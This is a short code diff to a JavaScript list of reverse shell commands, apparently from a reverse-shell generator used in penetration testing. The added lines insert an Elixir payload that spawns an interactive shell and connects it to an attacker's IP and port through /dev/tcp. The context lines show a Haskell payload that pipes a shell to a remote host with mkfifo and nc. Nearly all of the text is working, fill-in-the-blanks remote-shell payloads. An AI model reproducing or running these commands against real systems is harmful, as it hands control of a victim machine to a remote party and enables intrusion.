@@ -90,6 +90,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "windows"]
         },
         {
+            "name": "Elixir",
+            "command": ":os.cmd('{shell} -i >& /dev/tcp/{ip}/{port} 0>&1')",
+            "meta": ["linux"]
+        },
+        {
             "name": "Haskell #1",
             "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"",
             "meta": ["linux", "mac"]
